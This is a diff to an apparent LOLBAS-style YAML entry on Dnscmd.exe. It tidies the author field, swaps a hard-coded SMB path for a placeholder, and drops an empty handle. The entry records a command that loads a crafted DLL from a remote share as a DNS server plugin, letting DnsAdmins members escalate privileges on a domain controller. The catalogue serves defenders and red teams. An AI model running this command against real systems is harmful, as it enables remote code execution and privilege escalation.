@@ -1,10 +1,10 @@
 ---
 Name: Dnscmd.exe
 Description: A command-line interface for managing DNS servers
-Author: 'Oddvar Moe'
+Author: Oddvar Moe
 Created: 2018-05-25
 Commands:
-  - Command: dnscmd.exe dc1.lab.int /config /serverlevelplugindll \\192.168.0.149\dll\wtf.dll
+  - Command: dnscmd.exe dc1.lab.int /config /serverlevelplugindll {PATH_SMB:.dll}
     Description: Adds a specially crafted DLL as a plug-in of the DNS Service. This command must be run on a DC by a user that is at least a member of the DnsAdmins group. See the reference links for DLL details.
     Usecase: Remotely inject dll to dns server
     Category: Execute
@@ -28,7 +28,6 @@ Resources:
   - Link: http://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html
 Acknowledgement:
   - Person: Shay Ber
-    Handle:
   - Person: Dimitrios Slamaris
     Handle: '@dim0x69'
   - Person: Nikhil SamratAshok
